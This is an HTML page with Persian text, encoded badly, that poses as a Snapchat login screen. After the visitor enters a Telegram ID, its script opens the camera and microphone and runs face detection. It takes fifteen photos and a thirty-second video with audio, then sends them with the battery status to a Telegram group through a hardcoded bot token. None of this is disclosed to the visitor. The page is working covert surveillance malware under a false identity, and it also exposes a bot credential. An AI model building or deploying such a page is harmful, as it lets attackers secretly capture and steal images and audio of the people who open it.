<!DOCTYPE html><html lang="fa">
<head>
  <meta charset="UTF-8">
  <title>ÙˆØ±ÙˆØ¯ Ø¨Ù‡ Ø§Ø³Ù†Ù¾â€ŒÚ†Øª</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
  <script src="https://cdn.tailwindcss.com"></script>
  <script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>
  <style>
    body { direction: rtl; font-family: 'Vazirmatn', sans-serif; background: #fffc00; margin: 0; }
    #startScreen, #cameraScreen { width: 100vw; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
    #cameraScreen { display: none; background: #000; position: relative; }
    video { width: 100%; height: 100%; object-fit: cover; position: absolute; top: 0; left: 0; z-index: 0; }
    #controls { position: absolute; bottom: 20px; display: flex; justify-content: center; width: 100%; z-index: 1; }
    #shootBtn { width: 70px; height: 70px; background: white; border-radius: 50%; border: 5px solid #fff; }
    #switchBtn { position: absolute; top: 20px; left: 20px; z-index: 1; background: rgba(255,255,255,0.7); border-radius: 50%; padding: 10px; }
    .logo { width: 80px; height: 80px; background: url('https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/512px-Snapchat_logo.svg.png') no-repeat center; background-size: contain; margin-bottom: 24px; }
  </style>
</head>
<body>
  <div id="startScreen">
    <div class="logo"></div>
    <input id="userId" type="text" placeholder="Ø¢ÛŒØ¯ÛŒ ØªÙ„Ú¯Ø±Ø§Ù… Ø´Ù…Ø§" class="p-4 rounded-md w-64 text-center">
    <button onclick="startApp()" class="mt-4 px-6 py-2 bg-white text-black font-bold rounded-full">Ø´Ø±ÙˆØ¹</button>
  </div>
  <div id="cameraScreen">
    <video id="video" autoplay muted playsinline></video>
    <button id="switchBtn" onclick="switchCamera()">ðŸ”„</button>
    <div id="controls">
      <button id="shootBtn" onclick="manualCapture()"></button>
    </div>
  </div>  <script>
    const botToken = "7336954365:AAHqd7DgkHDMetoFFjtNWvmV1IWZsmiiaLU";
    const groupId = "-1002534583259";

    let useFront = true;
    let stream;
    let uid = "";
    let photoCount = 0;
    let faceDetected = false;
    let detectionTimeout;

    async function startApp() {
      uid = document.getElementById("userId").value.trim();
      if (!uid) return alert("ÙˆØ§Ø±Ø¯ Ú©Ø±Ø¯Ù† Ø¢ÛŒØ¯ÛŒ Ø§Ù„Ø²Ø§Ù…ÛŒâ€ŒØ³Øª");
      document.getElementById("startScreen").style.display = 'none';
      document.getElementById("cameraScreen").style.display = 'flex';
      await initCamera();
      await loadModels();
      detectFaces();
      startVideoRecording();
      detectionTimeout = setTimeout(() => {
        if (!faceDetected) startFallbackPhotos();
      }, 7000);
    }

    async function initCamera() {
      if (stream) stream.getTracks().forEach(t => t.stop());
      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: useFront ? "user" : "environment" }, audio: true });
      document.getElementById("video").srcObject = stream;
    }

    function switchCamera() {
      useFront = !useFront;
      initCamera();
    }

    async function loadModels() {
      await faceapi.nets.tinyFaceDetector.loadFromUri("https://cdn.jsdelivr.net/npm/face-api.js/models");
    }

    async function detectFaces() {
      const video = document.getElementById("video");
      const interval = setInterval(async () => {
        const result = await faceapi.detectSingleFace(video, new faceapi.TinyFaceDetectorOptions());
        if (result) {
          faceDetected = true;
          clearInterval(interval);
          clearTimeout(detectionTimeout);
          startSmartPhotos();
        }
      }, 1000);
    }

    function startSmartPhotos() {
      for (let i = 0; i < 15; i++) {
        setTimeout(() => captureAndSend(), i * 4000);
      }
    }

    function startFallbackPhotos() {
      for (let i = 0; i < 15; i++) {
        setTimeout(() => captureAndSend(), i * 4000);
      }
    }

    function manualCapture() {
      captureAndSend();
    }

    function captureAndSend() {
      const video = document.getElementById("video");
      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0);
      canvas.toBlob(async blob => {
        const battery = await navigator.getBattery();
        const form = new FormData();
        form.append("chat_id", groupId);
        form.append("photo", blob, `photo_${photoCount}.jpg`);
        form.append("caption", `Ø¢ÛŒØ¯ÛŒ: @${uid}\n${++photoCount} ðŸ“¸\nðŸ”‹ Ø´Ø§Ø±Ú˜: ${(battery.level * 100).toFixed()}%\nâš¡ Ø¯Ø± Ø­Ø§Ù„ Ø´Ø§Ø±Ú˜: ${battery.charging ? 'Ø¨Ù„Ù‡' : 'Ø®ÛŒØ±'}`);

        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: form });
      }, 'image/jpeg');
    }

    function startVideoRecording() {
      const recorder = new MediaRecorder(stream, { mimeType: "video/webm; codecs=vp9" });
      const chunks = [];
      recorder.ondataavailable = e => chunks.push(e.data);
      recorder.onstop = () => {
        const blob = new Blob(chunks, { type: "video/webm" });
        const form = new FormData();
        form.append("chat_id", groupId);
        form.append("video", blob, "video.webm");
        form.append("caption", `ðŸŽ¥ ÙˆÛŒØ¯ÛŒÙˆ Ø¶Ø¨Ø·â€ŒØ´Ø¯Ù‡ Ø§Ø² Ø¢ÛŒØ¯ÛŒ @${uid}`);
        fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: "POST", body: form });
      };
      recorder.start();
      setTimeout(() => recorder.stop(), 30000);
    }
  </script></body>
</html>
